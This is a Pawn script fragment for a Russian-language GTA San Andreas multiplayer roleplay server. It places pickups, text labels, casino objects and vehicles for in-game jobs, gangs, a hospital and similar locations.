cPickup[1] = CreatePickup(19134, 1, -1957.9189,307.2838,35.4688); // B
cPickup[2] = CreatePickup(19134, 1, 2200.8330,1394.0011,11.0625); // A
Pickup[0] = CreatePickup(1314, 23, 363.6462,154.5916,1025.7965, 1);
Pickup[1] = CreateDynamicCP(358.7415,164.7491,1008.3828, 1.0,1,3);
Pickup[2] = CreatePickup(353, 23, 290.1874,-109.6787,1001.5156, 2);
Pickup[3] = CreatePickup(353, 23, 290.1874,-109.6787,1001.5156, 1);
Pickup[4] = CreatePickup(353, 23, 313.2172,295.3297,1000.0850, -1);
Pickup[5] = CreatePickup(353, 23, 290.1874,-109.6787,1001.5156, 4);
Pickup[6] = CreatePickup(1275, 23, 210.9161,-8.0501,1001.2109, 1);
Pickup[7] = CreatePickup(1275, 23, 210.9161,-8.0501,1001.2109, 2);
Pickup[8] = CreatePickup(353, 23, 376.3256,188.2382,1008.3893, -1);
Pickup[10] = CreateDynamicCP(-2026.7606,-114.3484,1035.1719, 1.0,1,3);
Pickup[11] = CreatePickup(19134, 23, 510.1440,-86.3119,997.9609, -1);
Pickup[12] = CreatePickup(19134, 23, 506.5644,-86.3119,997.9609, -1);
Pickup[13] = CreatePickup(19134, 23, 489.7846,-81.6869,997.9578, -1);
Pickup[14] = CreatePickup(19134, 23, 509.0951,-84.4070,997.9609, -1);
Pickup[15] = CreatePickup(19134, 23, 509.0951,-85.4056,997.9609, -1);
Pickup[16] = CreatePickup(19134, 23, 511.1303,-84.3520,997.9609, -1);
Pickup[17] = CreatePickup(19134, 23, 511.1303,-85.2946,997.9609, -1);
Pickup[18] = CreatePickup(19134, 23, 510.1202,-83.3744,997.9609, -1);
Pickup[19] = CreatePickup(18631, 23, 1087.3658,-1803.1427,13.6022);// HELP DIALOG
Pickup[21] = CreatePickup(1239, 23, -2021.6331,-116.7530,1035.1719, 1);
Pickup[22] = CreatePickup(1239, 23, 360.2308,-2031.9965,7.8359);
Pickup[26] = CreatePickup(1275, 23, 641.6313,887.7375,-42.9271);
Pickup[27] = CreatePickup(1582, 23, 1093.7653,-1803.0846,13.6038); // HEAL PICKUP
Pickup[28] = CreatePickup(1240, 23, 584.7324,929.6288,849.4500);
Pickup[29] = CreatePickup(1240, 23, -2026.9094,-119.4015,1035.1719, 1);
Pickup[30] = CreatePickup(1239, 23, 2392.8579,1042.5146,10.8203);
Pickup[33] = CreatePickup(1275,23,2152.5144,1600.2333,1006.1733);
narkoenter[1] =  CreatePickup(1318,23,318.6952,1114.5037,1083.8828);//наркопритон
narkoenter[0] =  CreatePickup(1318,23,2158.1404,-1611.8505,14.3473);//наркопритон
narkopikup = CreatePickup(1241, 23, 323.0342,1118.5804,1083.8828); //
reddragonpickup[0] =  CreatePickup(1274,23,1139.0155,-3.4099,1000.6797);//DICE
reddragonpickup[1] =  CreatePickup(1582,23,1139.1683,-6.4653,1000.6719);//DRINK
sportpickup = CreatePickup(1275,23,770.8220,-77.3209,1000.6563);//спортзал работа
sportpickup = CreatePickup(1275,23,770.8220,-77.3209,1000.6563);//спортзал работа
banklv[0] = CreatePickup(1274,23,2065.0540,2383.7383,119.6758);//банк лв 1
banklv[1] = CreatePickup(1274,23,2068.9722,2383.7056,119.6758);//банк лв 1
//new system job
shp[0] = CreatePickup(19197,24,-435.8103,1424.9624,20.0968);
shp[1] = CreatePickup(19197,24,-424.1991,1377.2360,13.7216);
shp[2] = CreatePickup(19197,24,-411.2820,1345.3964,13.1247);
shp[3] = CreatePickup(19197,24,-395.2596,1269.8488,7.5029);
kassenter = CreatePickup(1318,24,2595.8359,2790.7739,10.8203);
kassexit = CreatePickup(1318,24,2577.3687,-1289.9537,1044.1250);
razdelzav = CreatePickup(1275,24,2570.0383,-1291.9961,1044.1250);
razdelshaht = CreatePickup(1275,24,-463.8935,1446.8136,21.0999);
razdelgruzika = CreatePickup(1275,24,-90.5984,1118.6833,20.7860);
razdelzveh = CreatePickup(1275, 24, 2593.2627,2774.6453,10.9844);
zveh[0] = AddStaticVehicle(609,2574.7952,2769.5439,10.8900,1.4657,56,56); // грузовик1
zveh[1] =AddStaticVehicle(609,2570.2937,2769.5112,10.8921,359.0209,56,56); // грузовик2
zveh[2] =AddStaticVehicle(609,2566.0557,2769.8032,10.8892,0.6799,56,56); // грузовик3
zveh[3] =AddStaticVehicle(609,2562.1155,2769.7808,10.8875,0.1597,56,56); // грузовик4
zveh[4] = AddStaticVehicle(609,2558.1196,2769.6282,10.8867,0.8802,56,56); // грузовик5
format(string, 50, "Ящиков с патронами: {9ACD32}%i / 1000", Mats[1]);
tPickup[3] = Create3DTextLabel(string,0xFFFFFFFF, 296.3503,-104.8139,1001.5156,20.0, 2, 1);
format(string, 50, "Ящиков с патронами: {9ACD32}%i / 1000", Mats[2]);
tPickup[16] = Create3DTextLabel(string,0xFFFFFFFF, 318.2803,-162.1156,999.5938,20.0, 1, 1);
format(string, 50, "Ящиков с патронами: {9ACD32}%i / 1000", Mats[4]);
tPickup[6] = Create3DTextLabel(string,0xFFFFFFFF, 292.6356,-112.8953,1002.4677,20.0, 3, 1);
jobproduct[0] = CreateVehicle(456,1977.2743,-2202.6660,13.7205,1.3566,-1,-1,300); //
CreateVehicle(456,1981.6621,-2202.7407,13.7209,359.9317,-1,-1,300); //
CreateVehicle(456,2008.0442,-2202.4634,13.7203,359.8727,-1,-1,300); //
CreateVehicle(456,2012.4175,-2202.4060,13.7200,0.4943,-1,-1,300); //
CreateVehicle(456,2040.1675,-2202.7964,13.7204,359.7066,-1,-1,300); //
//Ruslan_Smk
pogruz[0] = CreateVehicle(530,-79.1197,1135.6547,19.7422,89.6923,-1,-1,300); //
CreateVehicle(530,-79.4723,1131.6654,19.7422,89.6923,-1,-1,300); //
CreateVehicle(530,-79.9422,1127.6841,19.7422,89.3790,-1,-1,300); //
pogruz[1] = CreateVehicle(530,-80.4319,1123.8220,19.7422,89.3790,-1,-1,300); //
jobproduct[1] = CreateVehicle(456,2044.4535,-2202.7217,13.7198,359.2769,-1,-1,300); //
//end
RobMatsPickup = CreatePickup(1239,23,335.5226,1963.3141,17.6406);//пикап воровать маты на зоне 51
RobZavodPickup = CreatePickup(1239,23,2523.9641,2818.5845,10.8203);//пикап воровать маты на заводе
//==============================================================================
Create3DTextLabel("<= Склад угля =>\nСтоимость за 1 кг: 3$\nЧто бы загрузиться введите /loadtruck [кол во]",COLOR_ORANGE,-1870.0830,-1718.5116,21.7500,24,0);
Create3DTextLabel("<= Склад запчастей =>\nСтоимость за 1 шт: 7$\nЧто бы загрузиться введите /loadtruck [кол во]",COLOR_ORANGE,2368.6980,2754.2109,10.8203,24,0);
Create3DTextLabel("<= ПОРТ San Fierro =>\nСтоимость закупки:\n Уголь 4$ за 1 кг\nЗапчасти 9$ за 1 шт\n\nДля разгрузки введите /unloadtruck",COLOR_ORANGE,-1739.3481,28.7827,5.5547,24,0);
Create3DTextLabel("Больничная палата № 1",COLOR_BLUE,1188.7759,-1345.3319,1585.9778,10,1);
Create3DTextLabel("{ff0000}___________________",COLOR_WHITE,1188.7759,-1345.3319,1585.9778,10,1);
Create3DTextLabel("Больничная палата № 2",COLOR_BLUE,1194.8943,-1345.3201,1585.9778,10,1);
Create3DTextLabel("{ff0000}___________________",COLOR_WHITE,1194.8943,-1345.3201,1585.9778,10,1);
Create3DTextLabel("Больничная палата  № 3",COLOR_BLUE,1188.7491,-1354.7456,1585.9778,10,1);
Create3DTextLabel("{ff0000}___________________",COLOR_WHITE,1188.7491,-1354.7456,1585.9778,10,1);
Create3DTextLabel("Больничная палата № 4",COLOR_BLUE,1194.9878,-1354.7144,1585.9778,10,1);
Create3DTextLabel("{ff0000}___________________",COLOR_WHITE,1194.9878,-1354.7144,1585.9778,10,1);
Create3DTextLabel("Кабинет Глав.врача",COLOR_WHITE,1191.9353,-1357.8268,1585.9778,10,1);
Create3DTextLabel("{ff0000}_____________",COLOR_WHITE,1191.9353,-1357.8268,1585.9778,10,1);
Create3DTextLabel("Веедите: {00cc00}/hospital\n{ffffff}Что бы выйти с больницы\nраньше срока\nСтоймость лечения: {00cc00}$800",COLOR_WHITE,1192.0161,-1362.4337,1584.9851,10,1);
Create3DTextLabel("{00a86b}Нарко притон\n\n{ffffff}Стоимость травы: {00a86b}1грамм - 40$",0xFFFFFFAA,323.0342,1118.5804,1084.9828,10.0,0,1);
//==============================================================================
CreateDynamic3DTextLabel("Добро пожаловать на "Namemode"{ffffff}\nПервым делом вам следует:\nОтправиться на начальную работу 'Грузчиком' либо 'Фермером'\nПосетить 24/7, там вы купите все необходимое\nЕдиное меню помощи: /mm\nФорум сервера: "Namesite"\n\n{FFFFFF}Ферма 0: {00FF00} работает",COLOR_GREEN, 1241.1255,-1816.3198,15.3217,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("{33ccff}Добро пожаловать в Банк!\nИспользуйте банкоматы без комиссии в нашем банке",0xFFFFFFFF, 2308.7996,-13.2478,26.7422,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
format(string, 50, "материалов: {9ACD32}%i / 500000", Mats[1]);
tPickup[3] = Create3DTextLabel(string,0xFFFFFFFF, 292.6356,-112.8953,1002.4677,20.0, 2, 1);
format(string, 50, "материалов: {9ACD32}%i / 500000", Mats[2]);
tPickup[4] = Create3DTextLabel(string,0xFFFFFFFF, 292.6356,-112.8953,1002.4677,20.0, 1, 1);
format(string, 50, "материалов: {9ACD32}%i / 500000", Mats[0]);
tPickup[5] = Create3DTextLabel(string,0xFFFFFFFF, 292.6356,-112.8953,1002.4677,20.0, 4, 1);
tPickup[12] = Create3DTextLabel(string,0xFFFFFFFF, 166.5414,1872.2140,1001.0322,20.0, 0, 1);
format(string, 50, "материалов: {9ACD32}%i / 500000", Mats[4]);
tPickup[6] = Create3DTextLabel(string,0xFFFFFFFF, 313.2937,296.6931,1000.1138,20.0, -1, -1);
//==============================================================================
CasinoText[0] = Create3DTextLabel("Стол №1: {FF0033}не работает",COLOR_ORANGE, 2231.0266,1619.3114,1007.1303,10.0, 0, 1);
CasinoText[1] = Create3DTextLabel("Стол №2: {FF0033}не работает",COLOR_ORANGE, 2242.7917,1619.2638,1007.1303,10.0, 0, 1);
//==============================================================================
CreateObject(1978,2230.8989,1619.5001,1006.2346,0.00,0.00,90.00); // Стол
//-------------------------------КАЗИНО==================-----------------------------
Braban[0] = CreateObject(1979,2229.5522,1619.2888,1006.1536,0.00,0.00,0.00); // Барабан
CreateObject(3106,2229.5710,1619.5341,1006.1126,0.00,0.00,0.00); // Шарик
CreateObject(1978,2242.4980,1619.5001,1006.2346,0.00,0.00,90.00);
Braban[1] = CreateObject(1979,2241.1545,1619.2888,1006.1536,0.00,0.00,0.00);
CreateObject(3106,2241.1467,1619.5341,1006.1126,0.00,0.00,0.00);
Create3DTextLabel("{fde910}Казино 'Caligula'\n{fde910}Информация о казино: {FFFFFF}/cinfo",COLOR_GREEN,2271.0503,1634.7507,1008.3594+0.8,45.0,0,1);
//==============================================================================
gryz1 = CreatePickup(1239, 23, 2793.1382,-2394.1799,13.9560, -1);
gryz2 = CreatePickup(1239, 23, 2797.1348,-2393.6558,13.9560, -1);
gryz3 = CreatePickup(1239, 23,2808.7729,-2392.2651,13.6285, -1);
robmats[0] = CreatePickup(1279, 23, 137.3943,1880.3402,17.8359, -1);
robmats[1] = CreatePickup(1279, 23, 177.1886,1840.7777,17.6406, -1);
robmats[2] = CreatePickup(1279, 23, 233.1926,1840.6000,17.6406, -1);
robmats[3] = CreatePickup(1279, 23, 171.5976,1834.8301,17.6406, -1);
robmats[4] = CreatePickup(1279, 23, 117.8136,1870.4919,17.8359, -1);
robmats[5] = CreatePickup(1279, 23, 113.5780,1875.2034,17.8359, -1);
robmats[6] = CreatePickup(1279, 23, 142.0425,1875.5176,17.8434, -1);
robmats[7] = CreatePickup(1279, 23, 191.3147,1931.3962,17.6406, -1);
robmats[8] = CreatePickup(1279, 23, 223.6203,1931.4690,17.6406, -1);
// Больница
Create3DTextLabel("Больница города 'Los Santos'",COLOR_WHITE,1172.9832,-1325.3738,15.3980,15,0);
Bolnica[0] = CreatePickup(19132, 23, 1172.9832,-1323.3738,15.3980, -1);// Вход
Bolnica[1] = CreatePickup(19132, 23, 1193.5707,-1336.3599,1584.9719, -1); // Выход
Create3DTextLabel("Офис 'ФБР'",COLOR_WHITE,-1972.5583,-1020.3107,32.1800,15,0);
fbipic[0] = CreatePickup(19132, 23, -1972.5583,-1020.3107,32.1719, -1);// Гл.Вход
fbipic[1] = CreatePickup(19132, 23, 326.9254,281.3374,1001.0942 -1); // Гл.Выход
Create3DTextLabel("Офис",COLOR_WHITE,-1954.1687,-1053.7252,32.2000,15,0);
fbipic[2] = CreatePickup(19132, 23, -1954.1687,-1053.7252,32.1719, -1);// Гараж - Офис
fbipic[3] = CreatePickup(19132, 23, 284.2171,282.0579,997.3000 -1); // Офис - Гараж
Create3DTextLabel("Крыша",COLOR_WHITE,-1954.1223,-1050.8270,32.2000,15,0);
fbipic[4] = CreatePickup(19132, 23, -1954.1223,-1050.8270,32.1719, -1);// Гараж - Крыша
fbipic[5] = CreatePickup(19132, 23, -1953.1453,-1034.1006,54.0000 -1); // Крыша - Гараж
// Банды Пикапы
grovpic[0] = CreatePickup(1318, 23, 2486.4280,-1644.5347,14.0000, -1);// Вход Grov
Create3DTextLabel("Grove Gang",COLOR_GREEN,2486.4280,-1644.5347,14.0772,15,0);//Грув 3d текст
grovpic[1] = CreatePickup(1318, 23, 2486.4326,-1643.6577,15.0059 -1); // Выход Grove
vagospic[0] = CreatePickup(1318, 23, 2795.6021,-1619.3314,10.9219, -1);// Вход Vagos
Create3DTextLabel("Vagos Gang",COLOR_GREEN,2795.6021,-1619.3314,10.9219,15,0);//Vagos 3d текст
vagospic[1] = CreatePickup(1318, 23, 2805.6355,-1618.0210,14.5990, -1); // Выход Vagos
rifapic[1] = CreatePickup(1318, 23, 2167.6304,-1783.9180,13.5756, -1); // Выход Rifa
rifapic[0] = CreatePickup(1318, 23, 2165.7852,-1786.4026,13.5197, -1);// Вход Rifa
Create3DTextLabel("Rifa Gang",COLOR_GREEN,2795.6021,-1619.3314,10.9219,15,0); //Rifa 3d текст
azpic[1] = CreatePickup(1318, 23, 1683.0773,-2096.4766,13.9339, -1); // Выход Aztec
azpic[0] = CreatePickup(1318, 23, 1684.7559,-2098.1616,13.8343, -1);// Вход Aztec
Create3DTextLabel("Aztec Gang",COLOR_GREEN,1684.7559,-2098.1616,13.8343,15,0); //Aztec 3d текст
balpic[0] = CreatePickup(1318, 23, 2483.4065,-1995.3439,13.8343, -1);// Вход баллас
Create3DTextLabel("Ballas Gang",COLOR_GREEN,2483.4065,-1995.3439,13.8343,15,0);//баллас 3d текст
balpic[1] = CreatePickup(1318, 23, 2482.9897,-1990.9724,13.8949, -1); // Выход баллас
arpic[0] = CreatePickup(1318, 23, 279.1676,1833.1394,18.0874, -1);// зона 51
arpic[1] = CreatePickup(1318, 23, 286.2856,1834.4884,17.6481, -1);// зона 51
//==============================================================================
Create3DTextLabel("[Раздевалка]\nВстаньте на иконку чтобы переодеться",COLOR_GREEN,2793.1382,-2394.1799,13.9560,40.0,0, 1);
Create3DTextLabel("[Касса]\nВстаньте на иконку чтобы получить зарплату",0x0000FFAA,2797.1348,-2393.6558,13.9560,40.0,0, 1);
Create3DTextLabel("•Помощь по работе•",COLOR_WHITE,2808.7729,-2392.2651,13.6285,50.0,0, 1);
////////////////////////////////////
grarm1car[0] = CreateVehicle(455,132.1151,1851.6721,18.1389,91.2155,55,1,300); //Flatbed
grarm1car[1] = CreateVehicle(455,131.6039,1837.2625,18.0785,89.5301,55,1,300); //Flatbed
////////////////////////////JOB PRODUCT////////////////////////////////////////
jobproduct[0] = CreateVehicle(456,2786.5605,-2417.7188,13.8075,91.2355,-1,-1,60); //
CreateVehicle(456,2788.2126,-2494.3130,13.8072,91.2355,-1,-1,60); //
CreateVehicle(440,2737.9542,-2388.6167,13.7532,179.9226,-1,-1,60); //
CreateVehicle(440,2741.5295,-2388.6218,13.7531,179.9226,-1,-1,60); //
CreateVehicle(440,2745.1663,-2388.6270,13.7531,179.9226,-1,-1,60); //
CreateVehicle(440,2748.7155,-2388.6328,13.7531,179.9226,-1,-1,60); //
CreateVehicle(440,2746.6423,-2462.8911,13.7525,272.3864,-1,-1,60); //
CreateVehicle(440,2746.7739,-2466.1138,13.7879,272.3806,-1,-1,60); //
CreateVehicle(440,2752.3909,-2388.6169,13.7603,179.6397,-1,-1,60); //
CreateVehicle(440,2746.5908,-2459.5146,13.7636,270.5418,-1,-1,60); //
CreateVehicle(440,2746.7878,-2447.9821,13.7620,268.9051,-1,-1,60); //
CreateVehicle(440,2746.8450,-2444.7056,13.7622,268.9051,-1,-1,60); //
CreateVehicle(440,2746.8850,-2441.3806,13.7623,268.9051,-1,-1,60); //
jobproduct[1] = CreateVehicle(440,2746.9553,-2469.3800,13.7879,272.3806,-1,-1,60); //
// ДАЛЬНОБОЙ
trucker1lvl[0] =  CreateVehicle(514,-1613.6688,46.4229,4.1511,45.0370,3,0,60); // trucker 1lvl
CreateVehicle(514,-1608.6700,50.1556,4.1585,45.0368,1,0,60); // trucker 1lvl
CreateVehicle(514,-1604.9165,53.9140,4.1630,45.0366,2,0,60); // trucker 1lvl
CreateVehicle(514,-1601.1349,57.7004,4.1630,45.0367,6,0,60); // trucker 1lvl
CreateVehicle(514,-1597.0360,61.8046,4.1631,45.0368,8,0,60); // trucker 1lvl
trucker1lvl[1] =  CreateVehicle(514,-1590.9624,67.8857,4.1675,45.0364,7,0,60); // trucker 1lvl
trucker3lvl[0] = CreateVehicle(515,-1635.7125,63.2883,4.5808,224.8603,0,0,60); // trucker 3lvl
CreateVehicle(515,-1639.8846,59.1462,4.6619,224.8604,1,4,60); // trucker 3lvl
CreateVehicle(515,-1645.1458,53.9111,4.6619,224.8603,6,1,60); // trucker 3lvl
CreateVehicle(515,-1650.2688,48.8143,4.6661,224.8605,4,5,60); // trucker 3lvl
trucker3lvl[1] = CreateVehicle(515,-1656.1420,42.9708,4.6660,224.8604,0,0,60); // trucker 3lvl
////////////////////////////// АРЕНДА АВТо //////////////////////////////////////
rentcar[0] = CreateVehicle(401,549.8221,-1265.4343,17.0220,215.7814,-1,-1,60); //
CreateVehicle(410,546.8323,-1267.1886,16.8957,213.4974,-1,-1,900); //
CreateVehicle(436,544.0206,-1269.4436,17.0336,212.4399,-1,-1,900); //
CreateVehicle(496,540.5546,-1271.5161,16.9526,217.9936,-1,-1,900); //
CreateVehicle(529,537.9678,-1274.2445,16.8748,217.7720,-1,-1,900); //
CreateVehicle(542,535.4222,-1276.6744,16.9855,219.3172,-1,-1,900); //
CreateVehicle(547,532.3304,-1278.8541,16.9774,216.5077,-1,-1,900); //
CreateVehicle(585,529.3488,-1281.6384,16.8284,215.5408,-1,-1,900); //
CreateVehicle(585,563.0034,-1273.4498,16.8289,102.2272,-1,-1,900); //
CreateVehicle(551,563.7888,-1277.2112,17.0427,103.1246,-1,-1,900); //
CreateVehicle(547,565.2295,-1281.0370,16.9806,101.7558,-1,-1,900); //
CreateVehicle(547,-1989.1776,272.5187,34.9108,265.6685,-1,-1,900); //
CreateVehicle(526,-1989.7894,269.0696,34.9493,264.7627,-1,-1,900); //
CreateVehicle(529,-1989.8297,265.3755,34.8095,263.7704,-1,-1,900); //
CreateVehicle(517,-1990.0052,261.3929,35.0342,262.1296,-1,-1,900); //
CreateVehicle(516,-1990.4156,257.4686,35.0227,261.3666,-1,-1,900); //
CreateVehicle(507,-1990.7373,253.4194,35.0138,261.7562,-1,-1,900); //
CreateVehicle(496,-1992.0854,249.8972,34.8882,260.9908,-1,-1,900); //
CreateVehicle(475,-1991.9836,246.0626,34.9752,260.4625,-1,-1,900); //
CreateVehicle(410,2139.1316,1398.3237,10.4653,179.1004,-1,-1,900); //
CreateVehicle(475,2132.7427,1397.7916,10.6227,179.8615,-1,-1,900); //
CreateVehicle(401,2116.6990,1398.0376,10.5957,179.2562,-1,-1,900); //
CreateVehicle(436,2107.1760,1398.0417,10.5869,179.8619,-1,-1,900); //
CreateVehicle(436,2126.3608,1409.0128,10.5874,0.2587,-1,-1,900); //
CreateVehicle(507,2119.8931,1409.4373,10.6365,359.5450,-1,-1,900); //
CreateVehicle(516,2110.2939,1409.1874,10.6543,0.5809,-1,-1,900); //
CreateVehicle(517,2135.9419,1409.1733,10.6752,358.2114,-1,-1,900); //
CreateVehicle(526,2142.3049,1408.7631,10.5870,0.1311,-1,-1,900); //
CreateVehicle(527,2123.1663,1398.1547,10.5278,179.8946,-1,-1,900); //
CreateVehicle(542,2126.4087,1397.6438,10.5559,179.3456,-1,-1,900); //
CreateVehicle(547,2129.6628,1409.1467,10.5553,0.7298,-1,-1,900); //
CreateVehicle(551,2107.1135,1409.4797,10.6209,1.0468,-1,-1,900); //
rentcar[1] = CreateVehicle(526,566.2156,-1284.5367,17.0149,102.6595,-1,-1,900); //
/////////////////////////////// МОПЕДЫ НА РЕспе НУБОВ ///////////////////////////
faggio[0] = CreateVehicle(462,1097.4550,-1775.7238,12.9426,88.3760,0,0,900); //
CreateVehicle(462,1097.1212,-1772.8490,12.9453,88.7187,0,0,900); //
CreateVehicle(462,1097.2850,-1769.7290,12.9489,90.1066,0,0,900); //
CreateVehicle(462,1097.1964,-1767.0612,12.9487,90.3124,0,0,900); //
CreateVehicle(462,1097.3939,-1763.8107,12.9522,88.8332,0,0,900); //
CreateVehicle(462,1084.1318,-1757.8969,13.0530,270,0,0,900); //
CreateVehicle(462,1084.1318,-1775.5468,13.0150,270,0,0,900); //
CreateVehicle(462,1084.1318,-1772.5947,13.0209,270,0,0,900); //
CreateVehicle(462,1084.1318,-1769.5976,13.0279,270,0,0,900); //
CreateVehicle(462,1084.1318,-1755.0050,13.0590,270,0,0,900); //
CreateVehicle(462,1084.1318,-1766.5458,13.0349,270,0,0,900); //
CreateVehicle(462,1084.1318,-1763.6777,13.0410,270,0,0,900); //
CreateVehicle(462,1084.1318,-1760.6943,13.0489,270,0,0,900); //
CreateVehicle(462,1077.7089,-1772.5290,13.0209,90,0,0,900); //
CreateVehicle(462,1077.7089,-1769.5329,13.0279,90,0,0,900); //
//////////////////////////// Шахта /////////////////////////////////////////////
CreateVehicle(462, -464.21301269531, 1441.8280029297, 20.555999755859, 286, -1, -1, 100); // Транспорт 0
CreateVehicle(462, -464.82901000977, 1444.5439453125, 20.555999755859, 285.99609375, -1, -1, 100); // Транспорт 1
CreateVehicle(462, -464.5530090332, 1443.1770019531, 20.555999755859, 285.99609375, -1, -1, 100); // Транспорт 2
faggio[1] = CreateVehicle(462,1097.3611,-1760.9666,12.9549,86.7055,0,0,900); //
////////////////////////////// АВТОБУСЫ //////////////////////////////////////
buscar[0] = CreateVehicle(431,1805.0083,-1930.5496,13.4881, 359.6030,2,6,60); //
CreateVehicle(431,1801.0833,-1930.5045,13.4886,359.0968,2,6,60); //
CreateVehicle(431,1797.1637,-1930.3956,13.4891,358.7280,2,6,60); //
CreateVehicle(431,1793.5295,-1930.2793,13.4867,359.2899,2,6,60); //
CreateVehicle(431,1789.7898,-1930.2487,13.4898,359.4187,2,6,60); //
CreateVehicle(431,1785.9792,-1930.2369,13.4902,0.7391,2,6,60); //
CreateVehicle(431,1782.1863,-1930.3291,13.4890,0.5598,2,6,60); //
CreateVehicle(431,2806.2493,1367.7533,10.8510,270.4489,16,86,60); // автобусы лв
CreateVehicle(431,2806.3394,1362.8693,10.8541,270.1660,16,86,60); //
CreateVehicle(431,2806.3599,1358.1427,10.8476,270.0286,16,86,60); //
CreateVehicle(431,2806.4082,1353.3931,10.8522,270.1113,16,86,60); //
CreateVehicle(437,2806.5791,1348.6183,10.8833,269.8230,16,86,60); //
CreateVehicle(437,2806.6074,1343.7616,10.8833,270.5894,16,86,60); //
CreateVehicle(437,2806.5837,1338.9972,10.8857,269.7455,16,86,60); //
CreateVehicle(437,2806.5696,1334.1976,10.8527,269.5435,16,86,60); //
CreateVehicle(431,-1974.3689,171.6140,27.7924,90.0751,1,4,60); // автобусы сф
CreateVehicle(431,-1974.3839,176.8849,27.7927,90.0518,1,4,60); //
CreateVehicle(431,-1974.3860,181.7248,27.7330,89.4794,1,4,60); //
CreateVehicle(431,-1974.4037,186.7716,27.6468,89.9690,1,4,60); //
CreateVehicle(437,-1974.7349,191.6180,27.6194,90.4808,10,10,60); //
CreateVehicle(437,-1974.7974,196.7498,27.5341,90.2381,10,10,60); //
CreateVehicle(437,-1974.8387,202.3020,27.4706,89.9567,10,10,60); //
buscar[1] = CreateVehicle(431,1778.4032,-1930.3259,13.4883,0.2609,2,6,60);
fuelcar[0] = CreateVehicle(583,285.5172,1394.7618,10.1267,92.0947,1,1,60); //
CreateVehicle(583,285.6495,1391.8717,10.1305,92.1380,1,1,60); //
CreateVehicle(583,285.7787,1388.7703,10.1264,92.2174,1,1,60); //
CreateVehicle(583,285.9521,1385.6863,10.1264,94.4238,1,1,60); //
CreateVehicle(583,286.1293,1382.5796,10.1265,94.0490,1,1,60); //
CreateVehicle(583,286.2761,1379.4426,10.1264,92.8482,1,1,60); //
CreateVehicle(583,286.3885,1376.5985,10.1264,92.0819,1,1,60); //
CreateVehicle(403,283.5932,1366.8313,11.1921,89.7761,2,2,60); //
CreateVehicle(403,283.7147,1362.2080,11.1926,89.5164,2,2,60); //
CreateVehicle(403,283.6336,1357.1893,11.2216,89.7186,2,2,60); //
CreateVehicle(403,283.5963,1352.5117,11.1817,89.7769,2,2,60); //
CreateVehicle(403,283.6777,1347.7845,11.1648,89.7439,2,2,60); //
CreateVehicle(403,283.5008,1342.9812,11.1682,89.0126,2,2,60); //
CreateVehicle(584,281.5816,1442.2512,11.6653,90.5705,1,1,39900); //
CreateVehicle(584,281.5816,1446.2512,11.6653,90.5705,1,1,39900); //
CreateVehicle(584,281.5816,1450.2512,11.6653,90.5705,1,1,39900); //
CreateVehicle(584,281.5816,1454.2512,11.6653,90.5705,1,1,39990); //
CreateVehicle(584,281.5816,1458.2512,11.6653,90.5705,1,1,39990); //
CreateVehicle(584,281.5816,1462.2512,11.6653,90.5705,1,1,99030); //
CreateVehicle(584,281.5816,1466.2512,11.6653,90.5705,1,1,99900); //
CreateVehicle(584,281.5816,1470.2512,11.6653,90.5705,1,1,99900); //
fuelcar[1] = CreateVehicle(583,286.5170,1373.5460,10.1264,92.8148,1,1,60); //
//==============================================================================
taxicar[0] = CreateVehicle(438,1438.7496,-1625.8700,13.3038,180.3415,-1,-1,60); //
CreateVehicle(438,1438.8221,-1641.2698,13.2902,180.2497,-1,-1,60); //
CreateVehicle(438,1438.8823,-1657.3301,13.2888,180.4427,-1,-1,60); //
CreateVehicle(438,1439.0367,-1672.5221,13.2781,180.5446,-1,-1,60); //
CreateVehicle(438,1627.2999,-1038.3496,23.9015,0.0014,6,6,60); //
CreateVehicle(438,1631.7948,-1038.3264,23.9028,359.3116,6,6,60); //
CreateVehicle(438,1636.4236,-1038.4514,23.9017,358.8607,6,6,60); //
CreateVehicle(438,1640.6385,-1038.5747,23.9015,358.6825,6,6,60); //
CreateVehicle(438,1645.1843,-1038.5706,23.9017,359.5001,6,6,60); //
CreateVehicle(438,1649.7466,-1038.5479,23.9018,359.3967,6,6,60); //
CreateVehicle(438,1654.1720,-1038.6019,23.9024,359.4599,6,6,60); //
CreateVehicle(438,1658.8188,-1038.6465,23.8999,358.8619,6,6,60); //
CreateVehicle(420,1627.3379,-1045.8484,23.6774,179.9777,6,6,60); //
CreateVehicle(420,1631.8121,-1045.8103,23.6771,178.9311,6,6,60); //
CreateVehicle(420,1636.2998,-1045.8575,23.6777,179.3683,6,6,60); //
CreateVehicle(420,1640.7577,-1045.8757,23.6781,180.1230,6,6,60); //
CreateVehicle(420,1645.2455,-1045.8328,23.6772,180.3875,6,6,60); //
CreateVehicle(420,1649.7179,-1045.6982,23.6779,179.9071,6,6,60); //
CreateVehicle(420,1654.1296,-1045.8118,23.6782,179.5723,6,6,60); //
CreateVehicle(420,1658.7972,-1045.8162,23.6779,178.6779,6,6,60); //
CreateVehicle(438,2853.9541,1348.4493,10.8113,89.5862,6,6,60); // такси лв
CreateVehicle(438,2853.9944,1351.6952,10.8093,90.2578,6,6,60); //
CreateVehicle(438,2853.9954,1355.0100,10.8103,89.5123,6,6,60); //
CreateVehicle(438,2853.9556,1345.1783,10.8115,88.8458,6,6,60); //
CreateVehicle(420,2853.8162,1358.1232,10.5880,88.7574,6,6,60); //
CreateVehicle(420,2853.8430,1361.4076,10.5864,89.6027,6,6,60); //
CreateVehicle(420,2853.8667,1364.5554,10.5877,89.0415,6,6,60); //
CreateVehicle(420,2853.8496,1367.6932,10.5865,90.0894,6,6,60); //
CreateVehicle(438,-1977.4972,105.3649,27.6907,89.9072,6,6,60); // такси сф
CreateVehicle(438,-1977.4924,101.6373,27.6914,89.0465,6,6,60); //
CreateVehicle(438,-1977.5160,97.7171,27.6907,88.5481,6,6,60); //
CreateVehicle(438,-1977.5590,93.3670,27.6904,88.6220,6,6,60); //
CreateVehicle(420,-1977.7975,89.2296,27.4651,88.9034,6,6,60); //
CreateVehicle(420,-1977.7703,84.9352,27.4653,89.3719,6,6,60); //
CreateVehicle(420,-1977.8074,80.4005,27.4674,89.3192,6,6,60); //
taxicar[1] = CreateVehicle(438,1439.2223,-1688.9529,13.2902,180.3683,-1,-1,60); //
nouncar[0] = CreateVehicle(486,692.3820,882.3915,-38.9564,73.5352,1,1,100); //
CreateVehicle(486,693.6558,887.1174,-38.6717,76.6255,1,1,100); //
CreateVehicle(486,694.4067,892.3955,-38.7377,85.1006,1,1,100); //
